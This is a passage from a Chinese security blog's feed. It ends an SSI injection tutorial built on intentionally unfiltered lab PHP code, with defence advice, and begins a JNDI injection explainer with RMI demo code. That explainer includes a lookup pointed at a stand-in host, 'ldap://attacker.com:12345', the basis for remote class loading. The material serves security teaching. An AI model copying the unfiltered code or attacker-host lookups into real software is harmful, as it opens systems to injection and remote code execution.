title="High级"></a>High级</h4><p>此级别下，后台程序对输入的内容进行了HTML编码后才输出到页面中，即完全防御住了XSS漏洞，同时也让SSI注入无法成功进行：</p><p><img src="/2019/09/28/SSI注入漏洞总结/12.png" alt=""></p><p><img src="/2019/09/28/SSI注入漏洞总结/13.png" alt=""></p><p>最为重要的尖括号<code>&lt;&gt;</code>都被HTML编码了，那就不可能再插入标签了，而SSI注入就是注入标签，这下啥戏都没有了。</p><p>这也从另一方面说明，成功防御XSS漏洞的HTML输出编码也能够有效防御SSI注入漏洞。</p><h4 id="源码简析"><a href="#源码简析" class="headerlink" title="源码简析"></a>源码简析</h4><p>在ssii.php中，关键代码如下，不同级别下xss()函数中调用的过滤函数是不一样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"security.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"security_level_check.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions_external.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"selections.php"</span>);</span><br><span class="line"></span><br><span class="line">$field_empty = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>($_COOKIE[<span class="string">"security_level"</span>])</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"0"</span> :</span><br><span class="line"></span><br><span class="line">            $data = no_check($data);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"1"</span> :</span><br><span class="line"></span><br><span class="line">            $data = xss_check_4($data);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"2"</span> :</span><br><span class="line"></span><br><span class="line">            $data = xss_check_3($data);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span> :</span><br><span class="line"></span><br><span class="line">            $data = no_check($data);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;       </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $firstname = ucwords(xss($_POST[<span class="string">"firstname"</span>]));</span><br><span class="line">    $lastname = ucwords(xss($_POST[<span class="string">"lastname"</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $field_empty = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $line = <span class="string">'&lt;p&gt;Hello '</span> . $firstname . <span class="string">' '</span> . $lastname . <span class="string">',&lt;/p&gt;&lt;p&gt;Your IP address is:'</span> . <span class="string">'&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var="REMOTE_ADDR" --&gt;&lt;/h1&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Writes a new line to the file</span></span><br><span class="line">        $fp = fopen(<span class="string">"ssii.shtml"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fputs($fp, $line, <span class="number">200</span>);</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        header(<span class="string">"Location: ssii.shtml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面我们跟到functions_external.php，查看几个防御函数是怎么写的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_check</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// htmlspecialchars - converts special characters to HTML entities    </span></span><br><span class="line">    <span class="comment">// '&amp;' (ampersand) becomes '&amp;amp;' </span></span><br><span class="line">    <span class="comment">// '"' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set</span></span><br><span class="line">    <span class="comment">// "'" (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set</span></span><br><span class="line">    <span class="comment">// '&lt;' (less than) becomes '&amp;lt;'</span></span><br><span class="line">    <span class="comment">// '&gt;' (greater than) becomes '&amp;gt;'  </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_4</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.</span></span><br><span class="line">    <span class="comment">// These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).</span></span><br><span class="line">    <span class="comment">// Do NOT use this for XSS or HTML validations!!!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>no_check()函数无任何过滤，对应Low级；xss_check_4()函数调用addslashes()函数进行过滤，即对引号继续转义操作，对应Medium级；xss_check_3()函数调用防御XSS的终极Boss——htmlspecialchars()函数进行过滤，将尖括号等进行了转义，对应High级。</p><h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>搜索是否存在.stm,.shtm和.shtml后缀的文件，若存在则进一步判断Web服务是否支持并开启了SSI，若开启了则进一步分析上述后缀的文件中是否存在用户输入内容未经过有效过滤就反射输出到页面中，若有则存在SSI注入漏洞。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li><p>若非必须，尽量关闭服务器的SSI功能；</p></li><li><p>对用户的输入进行严格的过滤，过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）；</p></li></ul><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">服务器端包含注入SSI分析总结</a></p><p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI" target="_blank" rel="noopener">Server-Side Includes (SSI) Injection</a>_Injection)</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SSI注入" scheme="https://www.mi1k7ea.com/tags/SSI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析JNDI注入</title>
    <link href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/</id>
    <published>2019-09-15T09:03:37.000Z</published>
    <updated>2019-09-28T03:39:03.400Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="何为JNDI"><a href="#何为JNDI" class="headerlink" title="何为JNDI"></a>何为JNDI</h3><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p><p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p><p>简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p><p>如图：</p><p><img src="/2019/09/15/浅析JNDI注入/1.png" alt=""></p><h4 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h4><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。</p><h4 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h4><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p><p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p><h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p><p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p><h3 id="JNDI的代码示例"><a href="#JNDI的代码示例" class="headerlink" title="JNDI的代码示例"></a>JNDI的代码示例</h3><p>在JNDI中提供了绑定和查找的方法：</p><ul><li>bind：将名称绑定到对象中；</li><li>lookup：通过名字检索执行的对象；</li></ul><p>下面是基本用法Demo，以RMI服务为例。</p><p>先定义一个Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span>+name+<span class="string">" password:"</span>+password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Server.java，其实是将服务端和客户端的代码写在一起了，分为两个部分。第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中；第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索person对象并输出出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化person对象</span></span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        p.setPassword(<span class="string">"Niubility!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person。</span></span><br><span class="line">        ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过lookup查找person对象</span></span><br><span class="line">        Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印出这个对象</span></span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        initPerson();</span><br><span class="line">        findPerson();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行Server的程序，findPerson()函数会成功从启动的JNDI服务中找到指定的对象并输出出来：</p><p><img src="/2019/09/15/浅析JNDI注入/2.png" alt=""></p><p><strong>一个题外话</strong></p><p>我们可以简单比较一下纯RMI写法和使用JNDI检索的写法，在纯RMI写法中的两种典型写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> remote.IRemoteMath;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//服务端</span></span><br><span class="line">    IRemoteMath remoteMath = <span class="keyword">new</span> RemoteMath();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">1099</span>);    </span><br><span class="line">    Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">    registry.bind(<span class="string">"Compute"</span>, remoteMath);</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//客户端</span></span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>);        </span><br><span class="line">    IRemoteMath remoteMath = (IRemoteMath)registry.lookup(<span class="string">"Compute"</span>);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端</span></span><br><span class="line">    PersonService personService=<span class="keyword">new</span> PersonServiceImpl();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">6600</span>);</span><br><span class="line">    Naming.rebind(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>, personService);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端</span></span><br><span class="line">PersonService personService=(PersonService) Naming.lookup(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>);</span><br></pre></td></tr></table></figure><p>而JNDI中相关代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="comment">//服务端</span></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">...</span><br><span class="line">    ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">    ctx.close();</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端</span></span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">    Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line">ctx.close();</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端</span></span><br><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br></pre></td></tr></table></figure><p>相比之下：</p><ul><li>服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中；</li><li>客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的；</li></ul><p>简单地说，纯RMI实现的方式主要是调用java.rmi这个包来实现绑定和检索的，而JNDI实现的RMI服务则是调用javax.naming这个包即应用Java Naming来实现的。</p><h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>Reference类表示对存在于命名/目录系统以外的对象的引用。</p><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p><p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p><p>几个比较关键的属性：</p><ul><li>className：远程加载时所使用的类名；</li><li>classFactory：加载的class中需要实例化类的名称；</li><li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li></ul><h3 id="远程代码和安全管理器"><a href="#远程代码和安全管理器" class="headerlink" title="远程代码和安全管理器"></a>远程代码和安全管理器</h3><p>这部分引用自：<a href="https://blog.csdn.net/u011721501/article/details/52316225" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/52316225</a></p><h4 id="Java中的安全管理器"><a href="#Java中的安全管理器" class="headerlink" title="Java中的安全管理器"></a>Java中的安全管理器</h4><blockquote><p>Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。</p><p><img src="/2019/09/15/浅析JNDI注入/3.png" alt=""></p><p>JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。</p><p>关于安全管理机制，可以详细阅读：</p><p><a href="http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/</a></p></blockquote><h4 id="JNDI的安全管理器"><a href="#JNDI的安全管理器" class="headerlink" title="JNDI的安全管理器"></a>JNDI的安全管理器</h4><p>这部分在后面绕过高版本JDK限制中也会具体讲到。</p><blockquote><p>对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：</p><p><img src="/2019/09/15/浅析JNDI注入/4.png" alt=""></p><p>针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码。</p></blockquote><h3 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h3><p>举前面的例子，JNDI实现的RMI服务中，可以在初始化配置JNDI设置时预先指定其上下文环境（RMI、LDAP、CORBA等），这里列出前面的两种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure><p>但在调用lookup()或者search()时，可以使用带URI动态的转换上下文环境，例如上面已经设置了当前上下文会访问RMI服务，那么可以直接使用LDAP的URI格式去转换上下文环境访问LDAP服务上的绑定对象而非原本的RMI服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span>);</span><br></pre></td></tr></table></figure><p>其原理可以跟踪代码找到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进去就知道了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 